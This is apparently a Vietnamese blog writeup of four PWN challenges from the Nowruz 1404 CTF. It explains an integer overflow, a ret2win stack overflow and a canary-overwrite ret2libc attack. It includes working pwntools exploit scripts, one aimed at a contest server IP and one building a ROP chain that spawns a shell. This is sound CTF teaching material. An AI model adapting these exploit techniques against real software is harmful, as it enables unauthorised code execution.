---
title: '[Writeup] - Nowruz 1404 (2025) - PWN'
description: "Writeup các challenge PWN của giải CTF Nowruz 1404 (2025)"
tag: ['PWN', 'Writeup']
top_img: /img/2025/Nowruz1404CTF/banner.png
cover: /img/2025/Nowruz1404CTF/banner.png
category: ['Writeup']
date: 2025-03-18 21:32:12
author:
    - d4kw1n
---




## Pwn/Seen Shop

### Challenge Description

![image](/img/2025/Nowruz1404CTF/image-1.png)

### Source code

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define NUM_SEENS 7

typedef struct {
    char name[20];
    int price;
} Seen;
int credit;

void displayMenu(Seen seens[]);
void addToBasket(Seen seens[], int quantities[]);
void checkout(Seen seens[], int quantities[]);

Seen seens[NUM_SEENS] = {
    {"Sabzeh", 30000},
    {"Senjed", 20000},
    {"Seer", 20000},
    {"Seeb", 10000},
    {"Samanu", 35000},
    {"Serkeh", 40000},
    {"Sekkeh", 80000000}
};

void topup(){
    puts("na bassete");
}

int main() {
    int quantities[NUM_SEENS] = {0};
    int choice;

    credit = 1000000;
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    do {
        puts("Shop Menu:");
        puts("1. Add to Basket");
        puts("2. Checkout");
        puts("3. Top up");
        puts("4. Exit");
        printf("Enter your choice: ");
        scanf("%d", &choice);
        
        switch (choice) {
            case 1:
                addToBasket(seens, quantities);
                break;
            case 2:
                checkout(seens, quantities);
                break;
            case 3:
                topup();
            case 4:
                return 0;
            default:
                puts("Invalid choice. Try again.");
        }
    } while (choice != 3);
    
    return 0;
}

void displayMenu(Seen seens[]) {
    puts("Available 7 Seens:");
    for (int i = 0; i < NUM_SEENS; i++) {
        printf("%d. %s - %d Toman\n", i + 1, seens[i].name, seens[i].price);
    }
}

void addToBasket(Seen seens[], int quantities[]) {
    int item, qty;
    displayMenu(seens);
    printf("Enter item number to add (1-7): ");
    scanf("%d", &item);
    if (item < 1 || item > NUM_SEENS) {
        puts("Invalid item.");
        return;
    }
    printf("Enter quantity: ");
    scanf("%d", &qty);
    if (qty < 1) {
        puts("Invalid quantity.");
        return;
    }
    quantities[item - 1] += qty;
    printf("Added %d %s(s) to your basket.\n", qty, seens[item - 1].name);
}

void checkout(Seen seens[], int quantities[]) {
    int total = 0;
    puts("Your Basket:");
    for (int i = 0; i < NUM_SEENS; i++) {
        if (quantities[i] > 0) {
            printf("%s - %d item = %d Toman\n", seens[i].name, quantities[i], seens[i].price * quantities[i]);
            total += seens[i].price * quantities[i];
        }
    }

    printf("Total: %d\n",total);
    if(total > credit){
        puts("Not enough credit.");
        exit(0);
    }

    if(quantities[6] > 10){
        puts("oh... pole ke mirize...");
        system("cat /flag");
    }
    puts("Thank you ~~ Have a nice Nowruz!");
    exit(0);
}
```

Sau khi review qua source code thì tóm lại chương trình sẽ mô phỏng lại một cửa hàng buôn bán online với các tính năng: `(1) Thêm vào giỏ hàng; (2) Thanh toán; (3) Gọi đến một hàm in ra một chuỗi "na bassete"; (4) Thoát chương trình.`

Để lấy được flag thì khi checkout số tiền thanh toán phải lớn hơn tổng số tiền hàng mà mình đã đặt mua, còn nếu không thì chương trình sẽ thoát.
Đồng thời, số lượng của sản phẩm **Sekkeh** phải > 10 thì mới lấy được flag.

=> Ở đây, chương trình mắc phải lỗi Integer Overflow ở logic xử lý tỉnh tổng số tiền cần thanh toán: `total += seens[i].price * quantities[i];`

Chỉ cần truyền số lượng sản phẩm cần mua đủ lớn để khiến cho **total** bị âm hoặc nhỏ đi => nhỏ hơn **credit** => Get the flag

### Exploit

Do server đã đóng nên mình sẽ build lại và mô phỏng lại quá trình khai thác

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Shop]
└─$ gcc seen-shop.c -o seen-shop

┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Shop]
└─$ ./seen-shop
Shop Menu:
1. Add to Basket
2. Checkout
3. Top up
4. Exit
Enter your choice: 1
Available 7 Seens:
1. Sabzeh - 30000 Toman
2. Senjed - 20000 Toman
3. Seer - 20000 Toman
4. Seeb - 10000 Toman
5. Samanu - 35000 Toman
6. Serkeh - 40000 Toman
7. Sekkeh - 80000000 Toman
Enter item number to add (1-7): 7
Enter quantity: 27
Added 27 Sekkeh(s) to your basket.
Shop Menu:
1. Add to Basket
2. Checkout
3. Top up
4. Exit
Enter your choice: 2
Your Basket:
Sekkeh - 27 item = -2134967296 Toman
Total: -2134967296
oh... pole ke mirize...

VSL{fake}
Thank you ~~ Have a nice Nowruz!

┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Shop]
└─$
```

## Pwn/Seen Guessing

### Challenge Description

![img](/img/2025/Nowruz1404CTF/image.png)

### Source code

Dùng IDA để phân tích

**Main** function

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char input[24]; // [rsp+0h] [rbp-20h] BYREF
  int i; // [rsp+18h] [rbp-8h]
  int found; // [rsp+1Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("Let's play a game!");
  puts("Guess all 7 Seens and you'll win.");
  while ( correct_guesses <= 6 )
  {
    printf("Enter a Seen: ");
    __isoc99_scanf("%100s", input);
    found = 0;
    for ( i = 0; i <= 6; ++i )
    {
      if ( !strcasecmp(input, seens[i]) && !guessed_flags[i] )
      {
        guessed_flags[i] = 1;
        strcpy(&guessed[20 * correct_guesses], input);
        ++correct_guesses;
        found = 1;
        printf("Correct! %d/%d guessed.\n", correct_guesses, 7);
        break;
      }
    }
    if ( !found )
      puts("Incorrect or already guessed. Try again.");
  }
  puts("You guessed all 7 Seens! Nice job... but this is all you get.");
  return 0;
}
```

**Win** function

```c
void __cdecl win()
{
  char buf[268]; // [rsp+0h] [rbp-110h] BYREF
  int fd; // [rsp+10Ch] [rbp-4h]

  fd = open("/flag", 0);
  buf[(int)read(fd, buf, 0x100uLL)] = 0;
  puts(buf);
}
```

### Exploit

Kiểm tra các cơ chế của chương trình

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Guessing]
└─$ checksec chall
[*] '/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Guessing/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

Qua đây và kết hợp với phân tích source code, mình nhận thấy chương trình có hàm **win** + **PIE tắt** + **Canary tắt** + Người dùng có thể nhập tới 100 bytes cho biến **input[24]**

=> Overwrite Return Address to Win function => Get flag

Lúc này, chỉ cần ghi đè địa chỉ ret 1 lần sau đó đoán đúng hết tất cả các câu đố để chương trình thoát ra khỏi vòng **while** để ret => Trở về địa chỉ hàm **Win** => PWN

**Code exploit**

```python
from pwn import *

# p = process("./chall")
p = remote("164.92.176.247", 5002)
elf = ELF("./chall", checksec=False)
padding = 40

ans = ['Sonbol', 'Sabzeh', 'Seer', 'Seeb', 'Senjed', 'Samanu', 'Serkeh']

payload = b"A" * padding + p64(elf.sym.win)

p.sendlineafter(b"Seen: ", payload)
for i in ans:
    p.sendlineafter(b"Seen: ", i.encode())
    
p.interactive()
```

### Get flag

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Guessing]
└─$ python3 sol.py 
[+] Starting local process './chall': pid 70
[*] Switching to interactive mode
Correct! 7/7 guessed.
You guessed all 7 Seens! Nice job... but this is all you get.

VSL{fake}

[*] Got EOF while reading in interactive
$  
```

## Eidi Diary

![Description](/img/2025/Nowruz1404CTF/{4277A0E8-9768-46D2-9DD0-CC92A42A6CFE}.png)

Bài này mình không làm kịp trong thời gian cuộc thi, vừa xong thì vừa end game nên hơi tiếc.

### Checksec

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Eidi Diary]
└─$ checksec chall
[*] '/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Eidi Diary/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Source code

- **main**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-120h] BYREF
  int i; // [rsp+4h] [rbp-11Ch]
  FILE *stream; // [rsp+8h] [rbp-118h]
  char s[264]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v8; // [rsp+118h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  while ( 1 )
  {
    puts("Eidi diary");
    puts("1 - Add Eidi");
    puts("2 - View Eidis");
    puts("3 - Exit");
    printf("Enter your choice: ");
    if ( (unsigned int)__isoc99_scanf("%d", &v4) != 1 )
      return 1;
    getchar();
    if ( v4 == 1337 )
    {
      stream = fopen("/proc/self/maps", "r");
      while ( fgets(s, 256, stream) )
        printf("%s", s);
      fclose(stream);
      exit(0);
    }
    if ( v4 > 1337 )
      goto LABEL_21;
    if ( v4 == 3 )
    {
      puts("Exiting!");
      for ( i = 0; i < eidiCount; ++i )
        free(*((void **)&eidiList + 3 * i));
      exit(0);
    }
    if ( v4 > 3 )
    {
LABEL_21:
      puts("Invalid choice. Try again.");
    }
    else if ( v4 == 1 )
    {
      addEidi();
    }
    else
    {
      if ( v4 != 2 )
        goto LABEL_21;
      viewEidis();
    }
  }
}
```

- **addEidi**

```c
unsigned __int64 addEidi()
{
  unsigned __int16 v0; // ax
  __int64 v2; // [rsp+8h] [rbp-A8h] BYREF
  __int64 v3; // [rsp+10h] [rbp-A0h] BYREF
  char *v4; // [rsp+18h] [rbp-98h]
  char buf[136]; // [rsp+20h] [rbp-90h] BYREF
  unsigned __int64 v6; // [rsp+A8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  printf("Enter the length of the giver's name: ");
  __isoc99_scanf("%lu", &v2);
  getchar();
  printf("Enter the name of the giver: ");
  v0 = 256;
  if ( (unsigned __int16)v2 <= 0x100u )
    v0 = v2;
  read(0, buf, v0);
  buf[v2] = 0;
  v4 = strdup(buf);
  printf("Enter the amount received: ");
  __isoc99_scanf("%lf", &v3);
  *((_QWORD *)&eidiList + 3 * eidiCount) = v4;
  qword_4050[3 * eidiCount] = v3;
  *((_WORD *)&unk_4048 + 12 * eidiCount++) = strlen(buf);
  puts("Eidi recorded successfully!");
  return v6 - __readfsqword(0x28u);
}
```

- **viewEidis**

```c
int viewEidis()
{
  int result; // eax
  int i; // [rsp+Ch] [rbp-4h]

  if ( !eidiCount )
    return puts("No Eidis recorded yet.");
  puts("List of Eidis Received:\n");
  for ( i = 0; ; ++i )
  {
    result = eidiCount;
    if ( i >= eidiCount )
      break;
    printf("%d. Amount: %.2lf From: ", i + 1, *(double *)&qword_4050[3 * i]);
    write(1, *((const void **)&eidiList + 3 * i), *((unsigned __int16 *)&unk_4048 + 12 * i));
  }
  return result;
}
```

### Analysis

Bài này được cấp **libc** nên mình nghĩ ngay là một bài **ret2libc**. Tuy nhiên **Canary** lại bật, nên mình đi tìm cách để leak các địa chỉ cần thiết trong chương trình.

Ở trong hàm `addEidi()`, mình chú ý thấy đoạn code cho phép người dùng nhập vào độ dài của biến `buf`, sau đó ở vị trí đó sẽ được đặt thành giá trị **null ('\x00')**. -> Sau đó, **strdup()** sẽ copy giá trị của biến `buf` vào trong `v4`.
  > Ở đây, điều lưu ý là hàm `strdup()` sẽ copy cho đến khi gặp phải ký tự **null** => Ở đây mình có thể tận dụng để leak các địa chỉ trên stack.

Hàm `viewEidis()` sẽ in ra các eidi mà mình đã thêm vào. Tận dụng điều này và phát hiện ở trên, mình có thể leak được các giá trị như **libc address** và **stack buffer**.

Đồng thời tận dụng việc byte cuối do người dùng nhập vào biến `v2` sẽ được gán bằng 0 (null) để có thể ghi đè giá trị của **Canary** thành giá trị mong muốn. Sau đó chỉ cần kết hợp tất cả dữ kiện thu được để thực hiện **ret2libc** để lấy được shell => Get flag

### Solution

```python
from pwn import *

p = process("./chall_patched")
elf = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def addEidi(size, name, amount):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"giver's name: ", str(size).encode())
    p.sendafter(b"giver: ", name)
    p.sendlineafter(b"received: ", str(amount).encode())
    

def viewEidis():
    p.sendlineafter(b'choice: ', b'2')
    
# Phase 1: Leak libc

addEidi(30, b"a" * 8, 0)
viewEidis()

p.recvuntil(b"a" * 8)
leak = u64(p.recv(6).ljust(8, b"\x00"))
libc.address = leak - 0x219380
info(f"Libc base: {hex(libc.address)}")
tls = libc.address - 0x2898  # TLS of canary

# Phase 2: Leak stack buffer

addEidi(22, b"a" * 16, 0)
viewEidis()
p.recvuntil(b"a" * 16)
leak = u64(p.recv(6).ljust(8, b"\x00")) - 0x40

info(f"Leak stack: {hex(leak)}")

# Phase 3: Overwrite canary

for i in range(1, 8):
    offset = tls - leak + i
    payload = b'A' * 136 + b'\x00' + b'\x00' * i
    info(f"Payload: {payload}")
    addEidi(offset, payload, 0)
    p.recvline()

# Phase 4: Exploit get shell

payload = flat(
    b"A" * 136, # buffer
    p64(0), # canary
    p64(0), # save rbp
    p64(libc.address + 0x000000000002882f), # rop: ret
    p64(libc.address + 0x000000000010f75b), # rop: pop rip ; ret
    p64(next(libc.search(b"/bin/sh"))), # /bin/sh
    p64(libc.sym.system) # system call
)

addEidi(256, payload, 0)

p.interactive()
```

![POC](/img/2025/Nowruz1404CTF/{DA5F52FD-A05D-4BFD-9D4D-27301B0CD729}.png)

## Pwn/gogogo

![Description](/img/2025/Nowruz1404CTF/{4199A921-43AE-4A86-900D-09DB93D22392}.png)

Bài này dạng lạ quá nên mình chưa biết solve kiểu gì. Có thời gian mình sẽ tìm writeup và nghiên cứu lại.
